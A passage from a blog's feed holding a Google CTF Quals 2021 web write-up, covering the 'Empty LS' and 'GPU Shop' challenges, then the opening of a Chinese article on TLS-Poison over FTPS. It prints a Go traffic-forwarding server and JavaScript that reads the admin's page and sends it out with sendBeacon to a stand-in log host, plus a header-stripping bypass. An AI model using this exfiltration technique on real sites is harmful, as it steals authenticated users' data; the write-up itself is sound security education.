WC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/static/google-ctf-2021.png" alt=""></p><p>OK. Let’s talk about the CTF.</p><h2 id="Empty-LS"><a href="#Empty-LS" class="headerlink" title="Empty LS"></a>Empty LS</h2><p>There is a web challenge called empty ls. This challenge examines a security risk in the MTLS scenario. We could get the following information from the challenge:</p><ol><li><p>There is a website <a href="https://www.zone443.dev/" target="_blank" rel="noopener">https://www.zone443.dev/</a>. Two primary services are offered on this website.</p></li><li><ol><li>This website provides a user registration service and offers user’s certificates for download. You could register a user and get a client certificate for your identity.</li><li>Another service is that it also provides a subdomain registration service. You could register a subdomain under zone443.dev and set an A record to an IP. So it means you could get a sub-domain that is entirely under your control.</li></ol></li><li><p>The challenge provides an <a href="https://www.zone443.dev/example.go" target="_blank" rel="noopener">example code</a> and a <a href="https://www.zone443.dev/clientca.crt.pem" target="_blank" rel="noopener">client CA cert</a> which could be used to verify users. Besides, you could report an URL, and the admin will check it.</p></li><li><p>There is another website <a href="https://admin.zone443.dev" target="_blank" rel="noopener">https://admin.zone443.dev</a>. If you visit the admin’s website with your certificate, it will return ‘Hello, user. You are not the admin.’ The ‘user’ is exactly your username when you registered on <a href="www.zone443.dev">www.zone443.dev</a>.</p></li></ol><p>So, obviously, we need to access this site as admin or steal the response when the admin visits the admin.zone443.dev in some way.</p><p>At first, I came up with an idea. Maybe we could steal the admin’s client certificate when the admin visits our website. After we get the admin’s certificate, we could try to use it to forge as admin and visit the admin.zone443.dev. But the idea is too naive. After I learn about some docs about MTLS, this may be impossible. So I get stuck.</p><p>Although the above idea doesn’t work, I think we are still on the right way. At least, our target in this challenge is much more evident than the target in letschat. (In the challenge letschat, we even don’t know what the target is, where the flag is and what we should access).</p><p>After a few hours, we found an interesting point. The certificate of the admin.zone443.dev is the wildcard. It is *.zone443.dev. But what does it mean? Then I tried to google ‘HTTPS wildcard certificate’ and ‘TLS client auth bypass’. The bad news is I couldn’t get anything helpful to solve the challenge. </p><p>We are stuck again until we came up with another idea. In the period, we also found that admin.zone443.dev doesn’t check the host. So this means there will be no warnings if you visit a subdomain whose A record is 34.140.9.160(the A record of admin.zone443.dev). That’s an interesting phenomenon.</p><p>OK. Let’s talk about XSS. If we want to read the content of the admin’s page, we need XSS. But if we’re going to XSS on our subdomain to read the content of the admin’s page, we need to break the same-origin policy. Is it really a way using a feature of HTTPS we don’t know to bypass the same-origin policy?</p><p>Based on the question, we thought, how about DNS Rebinding? But there are quite a few limitations. The max execution time of the bot’s chrome is about 10s, but the time of chrome’s DNS cache is 60s. You can’t set two A records when you register your subdomain, either. </p><p>It seems we are stuck again. All right.</p><p>Let’s review the whole challenge. Do you still remember we could take all control of a subdomain? Yeah. It means we could do what we want to do on it. So what about traffic forwarding? If we forward the traffic to admin.zone443.dev when the admin visits our website, what do you think will happen next? The response is from admin.zone443.dev, but the domain is our domain!</p><p>Why? As we said above, the certificate of admin.zone443.dev is wildcard, and it ignores the host header in HTTP, so there will be no warnings and no errors in this period. What’s more, for admin, he actually visits admin.zone443.dev with his certificate, and for browser, it thinks the domain admin visits is our domain. So, in this scenario, if we send an AJAX request to request the admin’s response on our domain, the browser will think this request doesn’t violate the same-origin policy. Because the domain which admin visit is our domain, the domain which AJAX requests is also our domain.</p><p>It makes sense! Quite like a variant DNS Rebinding. The process of the exploit is as follows.</p><ol><li>Register a subdomain through the subdomain registration service, which is provided by the challenge.</li><li>Report your subdomain to admin.</li><li>The admin’s browser makes the first request. At this time, the admin will visit your site and execute javascript on your page. The JS code will make an AJAX request to your subdomain.</li><li>The second request is made by AJAX. You should forward the traffic to admin.zone443.dev at this time.</li><li>In the end, after you get the response from AJAX, send the response to your HTTP log in some way, and you could get the flag.</li></ol><p>That’s all the process to solve the challenge. We write a go server to forward the traffic. Thanks to my great teammate.</p><p></p><figure class="highlight go hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> (</span><br><span class="line">    <span class="hljs-string">"crypto/tls"</span></span><br><span class="line">    <span class="hljs-string">"crypto/x509"</span></span><br><span class="line">    <span class="hljs-string">"encoding/pem"</span></span><br><span class="line">    <span class="hljs-string">"fmt"</span></span><br><span class="line">    <span class="hljs-string">"io"</span></span><br><span class="line">    <span class="hljs-string">"io/ioutil"</span></span><br><span class="line">    <span class="hljs-string">"log"</span></span><br><span class="line">    <span class="hljs-string">"net"</span></span><br><span class="line"></span><br><span class="line">    <span class="hljs-string">"github.com/valyala/fasthttp"</span></span><br><span class="line">    <span class="hljs-string">"golang.org/x/sync/errgroup"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="hljs-comment">// clientCAPool consructs a CertPool containing the client CA.</span></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">clientCAPool</span><span class="hljs-params">()</span><span class="hljs-params">( * x509.CertPool, error)</span></span> {</span><br><span class="line">    caCertPem, err: = ioutil.ReadFile(<span class="hljs-string">"clientca.crt.pem"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"error reading clientca cert: %v"</span>, err)</span><br><span class="line">    }</span><br><span class="line">    caCertBlock, rest: = pem.Decode(caCertPem)</span><br><span class="line">    <span class="hljs-keyword">if</span> caCertBlock == <span class="hljs-literal">nil</span> || <span class="hljs-built_in">len</span>(rest) &gt; <span class="hljs-number">0</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"error decoding clientca cert PEM block. caCertBlock: %v, len(rest): %d"</span>, caCertBlock, <span class="hljs-built_in">len</span>(rest))</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">if</span> caCertBlock.Type != <span class="hljs-string">"CERTIFICATE"</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"clientca cert had a bad type: %s"</span>, caCertBlock.Type)</span><br><span class="line">    }</span><br><span class="line">    caCert, err: = x509.ParseCertificate(caCertBlock.Bytes)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">"error parsing clientca cert ASN.1 DER: %v"</span>, err)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    cas: = x509.NewCertPool()</span><br><span class="line">    cas.AddCert(caCert)</span><br><span class="line">    <span class="hljs-keyword">return</span> cas, <span class="hljs-literal">nil</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">servePage</span><span class="hljs-params">(conn net.Conn)</span> <span class="hljs-title">error</span></span> {</span><br><span class="line">    log.Printf(<span class="hljs-string">"serve page"</span>)</span><br><span class="line">    clientCA, err: = clientCAPool()</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    serverCert, err: = tls.LoadX509KeyPair(<span class="hljs-string">"fullchain.pem"</span>, <span class="hljs-string">"privkey.pem"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    tlsConn: = tls.Server(conn, &amp; tls.Config {</span><br><span class="line">        Certificates: [] tls.Certificate {</span><br><span class="line">            serverCert</span><br><span class="line">        },</span><br><span class="line">        ClientAuth: tls.VerifyClientCertIfGiven,</span><br><span class="line">        ClientCAs: clientCA,</span><br><span class="line">    })</span><br><span class="line">    err = tlsConn.Handshake()</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    }</span><br><span class="line">    srv: = fasthttp.Server {</span><br><span class="line">        DisableKeepalive: <span class="hljs-literal">true</span>,</span><br><span class="line">        Handler: fasthttp.FSHandler(<span class="hljs-string">"static"</span>, <span class="hljs-number">0</span>),</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">return</span> srv.ServeConn(tlsConn)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">serveProxy</span><span class="hljs-params">(conn net.Conn)</span> <span class="hljs-title">error</span></span> {</span><br><span class="line">    next, err: = net.Dial(<span class="hljs-string">"tcp"</span>, <span class="hljs-string">"admin.zone443.dev:443"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-keyword">var</span> group errgroup.Group</span><br><span class="line">    group.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span> <span class="hljs-title">error</span></span> {</span><br><span class="line">        _, err: = io.Copy(conn, next)</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    })</span><br><span class="line">    group.Go(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span> <span class="hljs-title">error</span></span> {</span><br><span class="line">        _, err: = io.Copy(next, conn)</span><br><span class="line">        <span class="hljs-keyword">return</span> err</span><br><span class="line">    })</span><br><span class="line">    <span class="hljs-keyword">return</span> group.Wait()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {</span><br><span class="line">    lis, err: = net.Listen(<span class="hljs-string">"tcp"</span>, <span class="hljs-string">":https"</span>)</span><br><span class="line">    <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">        log.Fatalf(<span class="hljs-string">"Failed to listen: %v"</span>, err)</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    count: = <span class="hljs-number">0</span></span><br><span class="line">    <span class="hljs-keyword">for</span> {</span><br><span class="line">        conn, err: = lis.Accept()</span><br><span class="line">        <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">            log.Fatalf(<span class="hljs-string">"Failed to accept: %v"</span>, err)</span><br><span class="line">        }</span><br><span class="line">        count++</span><br><span class="line">        <span class="hljs-keyword">if</span> count == <span class="hljs-number">1</span> {</span><br><span class="line">            <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {</span><br><span class="line">                err: = servePage(conn)</span><br><span class="line">                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">                    log.Printf(<span class="hljs-string">"Failed to serve page: %v"</span>, err)</span><br><span class="line">                }</span><br><span class="line">            }()</span><br><span class="line">        } <span class="hljs-keyword">else</span> {</span><br><span class="line">            <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> {</span><br><span class="line">                err: = serveProxy(conn)</span><br><span class="line">                <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {</span><br><span class="line">                    log.Printf(<span class="hljs-string">"Failed to serve proxy: %v"</span>, err)</span><br><span class="line">                }</span><br><span class="line">            }()</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>The javascript code is something like this.</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> xhttp = <span class="hljs-keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhttp.onreadystatechange = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) </span>{</span><br><span class="line">  navigator.sendBeacon(<span class="hljs-string">'https://http_log'</span>, <span class="hljs-keyword">this</span>.responseText)</span><br><span class="line">};</span><br><span class="line">xhttp.open(<span class="hljs-string">"GET"</span>, <span class="hljs-string">"/"</span>, <span class="hljs-literal">true</span>);</span><br><span class="line">xhttp.withCredentials = <span class="hljs-literal">true</span>;</span><br><span class="line">xhttp.send();</span><br></pre></td></tr></tbody></table></figure><p></p><p>At last, we got the flag. Pretty cool, man!</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/static/google-ctf-2021-web1.png" alt=""></p><h2 id="GPU-Shop"><a href="#GPU-Shop" class="headerlink" title="GPU Shop"></a>GPU Shop</h2><p>This challenge has an environment that is so complex that I don’t know how to explain it. I want to try my best to describe the setting of the challenge in short.</p><p>The challenge provides two services. </p><ol><li>The first service is a reverse proxy service <a href="https://paymeflare-web.2021.ctfcompetition.com" target="_blank" rel="noopener">https://paymeflare-web.2021.ctfcompetition.com</a>. After you log in to this site with your Google account, you could set some settings according to the <a href="https://paymeflare-web.2021.ctfcompetition.com/doc" target="_blank" rel="noopener">document</a>.<ul><li>The reverse proxy will set an HTTP header x-pay and visit your IP. </li><li>If you want to visit the URL which has ‘checkout’, the proxy will add an HTTP header ‘X-Wallet’. </li></ul></li><li>There is another service <a href="http://gpushop.2021.ctfcompetition.com" target="_blank" rel="noopener">http://gpushop.2021.ctfcompetition.com</a>. This website uses the paymeflare service as the reverse proxy. You could buy the flag on this website.</li></ol><ul><li><ul><li>When you try to buy the flag, it will get the eth address from the HTTP header ‘X-Wallet’. </li><li>Request the balance of the eth address through cloudflare-eth.com.</li><li>If your balance is greater than your cost, you will get the flag.</li></ul></li></ul><p><del>We don’t know how to solve the challenge, so we ask our boss to get a pretty rich eth address and buy the flag in the end.</del></p><p>Although there are many proxies in the challenge, we could use URLEncode to bypass the ‘checkout’ limitation, and the backend will not get the ‘X-Wallet’ header. The GPU shop will get a pretty rich eth address because of the code used in gpushop.</p><p></p><figure class="highlight php hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format_addr</span><span class="hljs-params">($addr)</span> </span>{</span><br><span class="line">true<span class="hljs-keyword">return</span> <span class="hljs-string">'0x'</span>.str_pad($addr, <span class="hljs-number">40</span>, <span class="hljs-string">'0'</span>, STR_PAD_LEFT);</span><br><span class="line">}</span><br><span class="line">$order-&gt;wallet = <span class="hljs-keyword">$this</span>-&gt;format_addr($request-&gt;header(<span class="hljs-string">'X-Wallet'</span>));</span><br></pre></td></tr></tbody></table></figure><p></p><p>When the header ‘X-Wallet’ is not set, the value of <code>$order-&gt;wallet</code> is <code>0x0000000000000000000000000000000000000000</code> and the balance of this address is <code>0x1c923afe206b9068f3f</code> which is greater than the cost of flag <code>1537550000000000000000</code>. So we could buy the flag.</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://i.niupic.com/images/2021/07/21/9otK.png" alt=""></p><h2 id="Other-Webs"><a href="#Other-Webs" class="headerlink" title="Other Webs"></a>Other Webs</h2><p>There are other two webs. One of them is callled letschat. In this challenge, you need to do a lot of brainstorming, and we take pretty much time to solve this challenge but still fail in the end. Although the intended solution is to predict the UUID of the message, I realized that some teams bruted the UUID to get the flag. Mmm, this really makes me mad. It’s too guessy and pretty annoying. I initially thought this challenge was inspired by some slack’s vulnerabilities from the real world, but the intended solution beat me.</p><p>The last web is an XSS challenge created by @terjanq. Pretty cool and amazing. You could read this <a href="https://gist.github.com/terjanq/458d8ec1148e96f7ccbdccfd908c56f6" target="_blank" rel="noopener">simple solution</a> written by him.</p><p>Thanks for reading. Hope my bad English has not affected your reading of this article. :&gt;</p></body></html>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&lt;p&gt;I played Google CTF Quals 2021 and here is my writeup.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://blog.zeddyu.info/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>TLS-Poison 攻击方式在 CTF 中的利用实践</title>
    <link href="https://blog.zeddyu.info/2021/05/19/tls-ctf/"/>
    <id>https://blog.zeddyu.info/2021/05/19/tls-ctf/</id>
    <published>2021-05-19T21:32:27.000Z</published>
    <updated>2021-09-27T17:45:58.724Z</updated>
    
    <content type="html"><![CDATA[<html><head></head><body><p>最近总结整理了 TLS Poison 攻击相关的知识，本文会继续讲 TLS Poison 利用，以及其在 CTF 的实际运用，也通过这个题目来聊聊 FTPS 相关知识。</p><blockquote class="colorquote success"><p>文章首发于长亭安全课堂：TLS-Poison 攻击方式在真实CTF赛题中的利用实践 <a href="https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ</a></p></blockquote><a id="more"></a><p><strong>PS: 在阅读本文之前，建议您掌握相关的 TLS Poison 先验知识，本文不会再重新详细介绍 TLS Poison 攻击的基础知识</strong></p><p>我们首先再来回顾 Black Hat 这个议题，为什么作者使用的是 When TLS Hacks You 呢？而不是 When HTTPS Hack You ，说明这个问题是出现在 TLS 特性身上，所以目前我们貌似都更多只局限地专注在 HTTPS 上，这是比较狭隘的考虑。既然如此，HTTPS 是 HTTP over TLS ，那其他协议是不是也可以呢？比如 FTPS ，FTP over TLS 等等？那我们来看看 FTPS 可以如何使用。</p><h2 id="Introduction-of-FTPS"><a href="#Introduction-of-FTPS" class="headerlink" title="Introduction of FTPS"></a>Introduction of FTPS</h2><blockquote><p>​    <strong>FTPS</strong> (also known <strong>FTP-SSL</strong>, and <em>FTP Secure</em>) is an extension to the commonly used <a href="https://en.wikipedia.org/wiki/File_Transfer_Protocol" target="_blank" rel="noopener">File Transfer Protocol</a> (FTP) that adds support for the <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security" target="_blank" rel="noopener">Transport Layer Security</a> (TLS) and, formerly, the 